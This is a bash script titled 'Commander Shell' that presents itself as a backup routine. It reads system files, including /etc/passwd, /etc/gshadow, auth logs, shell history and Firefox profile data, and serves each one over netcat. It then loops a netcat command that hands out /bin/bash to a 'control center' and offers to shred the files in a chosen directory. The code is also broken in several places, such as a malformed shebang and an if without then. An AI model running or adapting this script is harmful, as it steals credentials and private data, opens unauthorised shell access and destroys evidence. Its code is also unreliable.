#/bin/bash	  #
# *************** #
# Commander Shell #
# *************** #
# section A:
############################################################################################
# Separate root and non-root files and directories before backup
################################################################################################
## store basic computer info into file fo transfer ###############################################
mkdir ~/backups && echo $PWD >> GEN_INFO  && echo $PATH >> GEN_INFO echo `uname -a` >> GEN_INFO
echo `ls` > ~/backups/etc_dir && echo `ls` /var/log > ~/backups/var_dir && echo `ls` ~/home > ~/backups/home_dir && echo `ls` ~/root > ~/backups/root_dir

# section B: 
### store filenames inside of an array	######################
declare -a array=( "/etc/passwd" "/etc/hostname" "/etc/profile" "/etc/timezone" "/etc/fstab"  "/etc/hosts" "/etc/gshadow"  "/var/log/kern.log" "/var/log/lastlog" "/var/log/user.log" "/var/log/auth.log" "/var/log/faillog" "/var/log/dmesg"  "/var/log/apt/term.log" "/var/log/apt/history.log" "~/.bash_history" "~/.bashrc" "~/.config" "~/.mozilla" "~/.profile" "~/.cache" "root_dir" "home_dir" )
for i in "${array[@]}";do		# iterate over the array to gather filenames
	echo "${i} -->>------->>-------->> SENDING FILE"
	echo "${i} .... -->>------->>--->> SENDING NOW"
	cat ${i} | nc -l -p  1234 -vvv		## sending the file 

	echo "SENT ${i} !!!"
	echo "FINISHED TRANSFERING THE FILES!!"

done
# section C:
trap exit INT  ## create a ctrl+c trap incase you want to stop the connection loop 
echo " BACKING UP OF SENSITIVE INFO COMPLETE, SERVICE RUNNING ON PORT 420 "
echo " CALLING BACK TO THE CONTROL CENTER !!! "
echo " OPENING UP FOR THE CALLBACK !!!!!!!!"
while [ a=a ]; do nc -c /bin/bash 127.0.0.1 4201; done;  ## open port 4201 non-root port allow use of system /bin/bash


echo " EXITING WOULD YOU LIKE TO DELETE THE FILES ? : "
echo " TYPE YES TO CONFIRM, NO TO DECLINE "

# section D:
read nuke
if [ $nuke='yes' ]
	echo "What Directory would you like to Shred ? :"
	read nukedir
	find $nukedir -type f -exec shred {} \;
	
	else
		echo "exiting :"
fi	


################
#separate sections into functions with conditional statements
#section B: Separate root and non-root files and directories
#Section D: What would be a reliable way to remove data without the use of shred * /dev/null /dev/zero
#
#
